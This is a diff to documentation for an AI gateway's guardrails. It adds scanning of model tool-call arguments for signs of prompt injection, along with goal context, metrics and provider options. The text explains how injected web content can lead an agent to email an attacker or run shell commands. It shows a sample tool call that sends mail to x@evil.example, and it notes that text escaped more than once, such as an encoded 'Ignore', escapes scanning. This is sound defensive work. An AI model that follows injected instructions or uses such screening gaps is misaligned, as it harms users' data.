@@ -22,6 +22,7 @@ In **Filters**, add a filter and choose **Guardrail** as the filter type. The fo
 | Detectors | What the provider looks for. For the built-in library these are categories; for external providers they are the provider's own detector names, with a threshold where the provider scores. |
 | Messages to inspect | On LLM requests: the user text of the current turn (`last_user`), all user messages (default), system and user messages, or every message. Tool results are inspected under every choice unless tool-result scanning is off (then only under every message); see [Tool results](#tool-results). Chat messages and tool calls always inspect the whole text. |
 | Tool results | Scan tool results (default on) and, optionally, a separate action for them. Unset, a tool result gets the filter's action, except that `block` becomes `quarantine`. |
+| Tool calls | Scan the arguments of the tools the model asks to run (default off), with an action of `block` or `log`; see [Tool calls](#tool-calls). |
 | If the provider fails | `closed` blocks (default on requests and tool calls), `open` lets the text through (default on responses). A timeout or error records a `guardrail.error` compliance event either way. On a request that needs several provider calls, or text the provider refuses, the affected text is flagged instead: see [Budgets and the verdict cache](#budgets-and-the-verdict-cache). |
 | Timeout | Per provider call, default 2000 ms. |
 | Streaming: evaluate every N characters | On response filters (the detail page calls it Streaming cadence): re-check the accumulated response every N characters (default 250 for the built-in library, 1000 for remote providers), and once more when the stream completes, so a response shorter than the cadence is still checked. Remote providers are never called per chunk. A block mid-stream stops the stream; a block at completion ends it with an error event and is recorded, but chunks already sent have reached the client. |
@@ -76,6 +77,25 @@ Not inspected, so not screened by any guardrail:
 - results of tools the vendor runs within one call (Anthropic server tools and `mcp_servers`, OpenAI built-in tools): the model reads them before the gateway sees them. They are inspected when the client sends them back on a later turn;
 - in Studio chat, the context a datasource adds to the prompt;
 - text escaped more than once: a tool result's JSON escapes are decoded one level (the escapes of the body itself are always decoded), so `\\u0049gnore` inside a string inside the tool result's JSON is read as `\u0049gnore`.
+
+### Tool calls
+
+A tool call is where an injection that reached the model turns into an action: a `send_email` to an address a web page chose, a `shell` command, an upload. A guardrail with tool-call scanning on reads the arguments of every tool call the model makes:
+
+- in a request's history: OpenAI `tool_calls[].function.arguments` and the legacy `function_call`, Ollama `tool_calls` (arguments as an object), Anthropic `tool_use`, `server_tool_use` and `mcp_tool_use` input, Google `functionCall` args, Bedrock `toolUse` input, and Responses `function_call`, `custom_tool_call`, `mcp_call` and `mcp_approval_request` items;
+- in a buffered (not streamed) response, in the same formats, on `/llm/` and on the `/ai/` and `/anthropic/` bridges to Bedrock, and in each line of native batch results.
+
+```json
+"tool_calls": {"scan": true, "on_detect": "block", "include_system": false}
+```
+
+Each call is classified as a whole, as the body holds it (a JSON string, or the raw JSON of an arguments object), and also decoded, keys and strings with their escapes read, as for tool results. A tool call is never rewritten, so its action is `block` or `log`. Unset, it is the filter's action where that is `block` or `log`, and `log` for any other action. On a response, `block` refuses the response, so the client never runs the call. On a request the call has already run on the client: `block` stops the request (and, because the client resends the call in its history, every later request of that conversation), and `log` records it.
+
+Tool calls are scanned across the whole history whatever the scope, like tool results, and the verdict cache answers the calls a client resends. They never share a provider call with the client's own text or with tool results. Compliance events name them with `kinds` `tool_call` and the tool in `tool_names`.
+
+**Goal context.** Whether a call is legitimate depends on what the model was asked to do. Each call carries a context: the latest user text before the call (for a response, the request's latest user text) and, with `include_system`, the system prompt, each cut to 4,096 characters (the first third and the last two thirds). Only providers that judge calls against the goal receive it (the [HTTP classifier](#http)); the verdict cache keys a call on its context too, so the same arguments under another goal are classified again. Tool results never carry a context.
+
+Tool-call scanning is off by default because arguments can hold what an agent read (file contents, records, credentials): with a remote provider, turning it on sends them to that provider. The built-in library scans arguments with the tool-result variants of its patterns. Lakera and Bedrock Guardrails get a call as assistant text, Azure AI Content Safety Prompt Shields as a document (indirect attacks), and Presidio and Azure AI Language PII analyse it like any other text.
 
 ### Quarantine
 
@@ -152,7 +172,7 @@ Blocks count towards `aistudio_policy_blocks_total` like any filter block. These
 
 | Metric | Labels | Meaning |
 |---|---|---|
-| `aistudio_guardrail_latency_seconds` | `provider`, `outcome` (`clean`, `flagged`, `error`), `action`, `segment_kind` (`text`, `tool_result`, `mixed`) | Latency of each provider call |
+| `aistudio_guardrail_latency_seconds` | `provider`, `outcome` (`clean`, `flagged`, `error`), `action`, `segment_kind` (`text`, `tool_result`, `tool_call`, `mixed`) | Latency of each provider call |
 | `aistudio_guardrail_errors_total` | `provider`, `fail_mode` (`open`, `closed`, or `unscanned` when the failed call's segments were flagged instead) | Provider failures and how they were handled |
 | `aistudio_guardrail_segments_total` | `provider`, `segment_kind`, `result` (`scanned`, `cached`, `unscanned`) | Request segments screened |
 | `aistudio_guardrail_cache_total` | `provider`, `outcome` (`hit`, `miss`) | Verdict cache lookups |
@@ -242,7 +262,17 @@ The gateway POSTs:
 }
 ```
 
-A tool result arrives as role `tool` with `kind: "tool_result"`, the tool's name and the call id; segments of other text carry none of the three, so a service written before they existed receives the JSON it always did. `tool_name` and `tool_call_id` come from the client and are cut to 256 bytes. A tool result is text the model did not get from the user: a classifier that tells direct from indirect injection should treat it as the indirect kind, for example:
+A tool result arrives as role `tool` with `kind: "tool_result"`, the tool's name and the call id; segments of other text carry none of the three, so a service written before they existed receives the JSON it always did. `tool_name` and `tool_call_id` come from the client and are cut to 256 bytes.
+
+On a filter that scans [tool calls](#tool-calls), a tool call arrives as role `assistant` with `kind: "tool_call"`, the tool's name, the call id, its arguments as `text`, and a `context` with the goal it should serve:
+
+```json
+{"index": 2, "role": "assistant", "kind": "tool_call", "tool_name": "send_email", "tool_call_id": "call_2",
+ "text": "{\"to\":\"x@evil.example\"}",
+ "context": {"user_goal": "Summarise my inbox", "system": "You are a mail assistant."}}
+```
+
+`system` is present only when the filter sets `tool_calls.include_system`. Tool results and other text never carry a `context`, and a filter that does not scan tool calls sends neither, so an existing service sees no change. A tool result is text the model did not get from the user: a classifier that tells direct from indirect injection should treat it as the indirect kind, for example:
 
 ```python
 @app.post("/classify")
@@ -309,7 +339,8 @@ A provider is Go code that implements `guardrails.Provider` (`Classify` and `Cap
 | `MaxCallChars` | The most text in one call; set it to `MaxChars` when the provider makes one request per segment anyway, so a large request runs in parallel. Without it, a remote provider gets calls of up to 32,768 characters. |
 | `Local` | In-process, no network: scanned in full, outside the remote budgets. |
 | `SegmentPerCall` | It makes one request per segment; the runner then sends every segment in calls of its own, run four at a time, each under the call timeout. |
-| `ToolSegments` | It handles tool results itself: they arrive as role `tool` with `Kind`, `ToolName` and `ToolCallID`. Without it they arrive as role `user` with no tool metadata, and findings are mapped back onto the tool result. Declare it only once the provider does something deliberate with tool results. |
+| `ToolSegments` | It handles tool results itself: they arrive as role `tool` with `Kind`, `ToolName` and `ToolCallID`. Without it they arrive as role `user` with no tool metadata, and findings are mapped back onto the tool result. Tool calls likewise arrive as role `assistant` with `Kind` `tool_call`, or without it as plain assistant text. Declare it only once the provider does something deliberate with tool results. |
+| `WantsGoal` | It judges a tool call against what the model was asked to do, so each tool call segment carries its `Context` (the user's goal, and the system prompt where the filter includes it). Other providers never get the user's text alongside a call. |
 | `Contextual` | Its verdict on one segment depends on the others sent with it; such a provider is never answered from the verdict cache. |
 | `Version` | Changes when the verdict for the same input may change (a new model); part of the verdict cache key. |
 
